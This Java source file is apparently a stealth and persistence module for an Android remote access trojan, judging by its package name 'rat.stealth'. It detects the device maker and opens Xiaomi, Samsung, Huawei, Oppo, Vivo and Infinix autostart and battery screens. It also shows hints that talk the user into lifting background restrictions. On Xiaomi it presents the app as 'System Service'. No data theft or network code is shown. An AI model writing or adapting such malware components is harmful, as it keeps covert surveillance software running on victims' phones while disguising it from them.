package com.wexow.rat.stealth;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

public class OemHelper {

    public static String getManufacturer() {
        return Build.MANUFACTURER.toLowerCase();
    }

    public static boolean isXiaomi() {
        String m = getManufacturer();
        return m.contains("xiaomi") || m.contains("redmi") || m.contains("poco");
    }

    public static boolean isSamsung() { return getManufacturer().contains("samsung"); }

    public static boolean isHuawei() {
        String m = getManufacturer();
        return m.contains("huawei") || m.contains("honor");
    }

    public static boolean isOppo() {
        String m = getManufacturer();
        return m.contains("oppo") || m.contains("realme") || m.contains("oneplus");
    }

    public static boolean isVivo() { return getManufacturer().contains("vivo"); }

    public static boolean isInfinix() {
        String m = getManufacturer();
        return m.contains("infinix") || m.contains("tecno") || m.contains("itel");
    }

    public static void openAutoStartSettings(Context ctx) {
        try {
            Intent i;
            if (isXiaomi()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if (isSamsung()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.samsung.android.sm",
                    "com.samsung.android.sm.app.dashboard.SmartManagerDashBoardActivity"));
            } else if (isHuawei()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
            } else if (isOppo()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if (isVivo()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if (isInfinix()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.transsion.phonemaster",
                    "com.cyin.himgr.autostart.AutoStartActivity"));
            } else {
                openAppDetails(ctx);
                return;
            }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) {
            openAppDetails(ctx);
        }
    }

    public static void openBatterySettings(Context ctx) {
        try {
            Intent i;
            if (isXiaomi()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.miui.powerkeeper",
                    "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"));
                i.putExtra("package_name", ctx.getPackageName());
                i.putExtra("package_label", "System Service");
            } else if (isSamsung()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.samsung.android.lool",
                    "com.samsung.android.sm.ui.battery.BatteryActivity"));
            } else if (isHuawei()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            } else if (isOppo()) {
                i = new Intent();
                i.setComponent(new ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.PermissionManagerActivity"));
            } else {
                openAppDetails(ctx);
                return;
            }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) {
            openAppDetails(ctx);
        }
    }

    public static void openAppDetails(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    public static String getBrandName() {
        if (isXiaomi()) return "Xiaomi (MIUI/HyperOS)";
        if (isSamsung()) return "Samsung (One UI)";
        if (isHuawei()) return "Huawei/Honor (EMUI)";
        if (isOppo()) return "Oppo/Realme/OnePlus";
        if (isVivo()) return "Vivo";
        if (isInfinix()) return "Infinix/Tecno";
        return "Android (" + Build.MANUFACTURER + ")";
    }

    public static String getSpecificHint() {
        if (isXiaomi())
            return "⚠️ On Xiaomi:\n1. Enable Autostart\n2. Battery → No restrictions\n3. Stop MIUI Optimization";
        if (isSamsung())
            return "⚠️ On Samsung:\n1. Battery → Never sleeping apps\n2. Add application\n3. Stop Auto optimization";
        if (isHuawei())
            return "⚠️ On Huawei/Honor:\n1. App launch → Manage manually\n2. Enable Auto-launch\n3. Add to Protected apps";
        if (isOppo())
            return "⚠️ On Oppo/Realme:\n1. Battery → Allow background\n2. Startup Manager → Allow";
        if (isVivo())
            return "⚠️ On Vivo:\n1. Background power → Allow\n2. Autostart Manager → Enable";
        if (isInfinix())
            return "⚠️ On Infinix/Tecno:\n1. Phone Master → Auto-start\n2. Battery → No restriction";
        return "⚠️ On :\n1. Settings → Apps → Battery\n2. Unrestricted\n3. Stop Battery Optimization";
    }
}